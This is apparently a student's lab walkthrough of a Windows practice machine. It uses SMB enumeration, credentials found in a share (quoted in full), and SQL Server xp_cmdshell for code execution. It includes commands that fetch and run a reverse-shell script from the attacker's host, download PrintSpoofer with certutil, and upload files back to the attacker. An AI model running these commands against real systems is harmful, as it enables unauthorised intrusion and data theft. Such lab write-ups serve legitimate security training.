==Target ip== 10.129.95.187

# 1. Nmap: 
-> I always want to start here to see what ports are open and what services are running.

Lets start with a basic scan and see what we can find:
`sudo nmap -sV -sC 10.129.95.187 -oN nmap.basic`

When that scan is done I want to do a deeper scan and run that while I do other tasks.

`sudo nmap -p- -sV -sC --script=default,vuln,exploit -T4 -oN nmap.full 10.129.95.187`

==Result of basic scan==

![[Pasted image 20250518173247.png]]

-> ==Thinking==: Ok there is a lot here
1. It's obviously a Windows machine
2. SMB is running (something we can look into)
3. 2017 SQL Server
4. httpd 2.0 running. I don't know what SSDP/UPnP is, but we can research it.

# Let's try enum4linux
`enum4linux -a 10.129.95.187` -> does **all** simple enumeration

==findings==:  

[+] Server 10.129.95.187 allows sessions using username '', password '' <- Anonymous sessions over SMB

Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none <- Vaild usernames

# Try to connect to an smbshare without creds
`smbclient -L \\10.129.95.187\\ -N`

==Findings==: 
1. This lists out a non default share called "backups", let's check that out. <- We do not have access to ADMIN$
	- `smbclient //10.129.95.187/backups -N`
	- This shows a file that we can get.
![[Pasted image 20250518174844.png]]

==Very small, sorry== There is a username and password in this file!
And This is the file it appears to be XML. I am not totally sure what to do with that but I know XXE is a think, time for some research. 

ID = ARCHETYPE\sql_svc
Password = M3g4c0rp123

==What this file is==: this is **XML**, specifically a **DTS (Data Transformation Services) configuration file** used by SQL Server Integration Services (SSIS).

# Going to 10.129.95.187:5985
Gives a 404. I am not sure why, maybe we can check on this later.

### The creds work for SMB, but not for the admin share.

# Lets use impacket `mssqlclient.py` to try the creds on the sql server:

Impacket location on my machine: `/usr/share/doc/python3-impacket/examples/`

==Command== 
`python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187 -windows-auth

*Login with password*

Tried these commands: 
"
SELECT SYSTEM_USER;
EXEC xp_cmdshell 'whoami';
"
But xp_cmdshell is not enabled. ==But we can enable xp cmdshell because we have privs!==

==Listing privileges==
![[Pasted image 20250518181401.png]]

==Limited privileges for Sql_svc. It is database admin but not OS-level admin==  What we need to do is upload a tool that can check for privilege escalation.

BUT -> SeImpersonatePrivilege allows for token impersonation, so we can try to upload a tool and take advantage of that.

**What is token impersonation?**: A technique where a lower-privileged user **impersonates a higher-privileged user’s security token** to perform actions they normally wouldn't be allowed to — like becoming `SYSTEM`.

### I need to download printspoofer and cross-compile it with mingw-w64

**Connect to the smbshare:** `smbclient //10.129.95.187/backups -U 'ARCHETYPE\sql_svc'`

==I cannot upload printspoofer on there, I need to find another way==

==Idea==: Maybe I can host the file on a python server and reach out with the database?

1. `python -m http.server 80` <- in the printspoofer directory
2. What is my ip? `ip a` -> look for tun0 (10.10.16.54)
3. *Log in to sql server*
4. `EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.16.54/PrintSpoofer.exe C:\Users\Public\PrintSpoofer.exe';` 
     <- Livin off the land!
 5. Verify its location `EXEC xp_cmdshell 'dir C:\Users\Public\PrintSpoofer.exe`
 6. Run it `EXEC xp_cmdshell 'C:\Users\Public\PrintSpoofer.exe -i -c cmd.exe';` ==The command did not work==
![[Pasted image 20250518220744.png]]

-> What now? 
	1. Maybe the print service is not running? or
	2. The machine is patched, we'll have to find another way (==I think getting winpeas on the machine and running it would be good!==)
	3. Got a reverse shell from here => https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3#:~:text=Got%20stderr%20working%20with%20this%20modification%3A
	4. Setup a Python server and ran this command to fetch the reverse shell: `EXEC xp_cmdshell "powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.54/revshell2.ps1')";`
	5. Run winpeas
	6. ==The user flag is in the sql_svc Desktop==

# How to upload a file from the victim machine to the attacker: 
*on the victim machine with python server on the attacker machine*
`powershell -Command "(New-Object Net.WebClient).UploadFile('http://10.10.16.54/upload', 'C:\Users\Public\winpeas_output.txt')"`

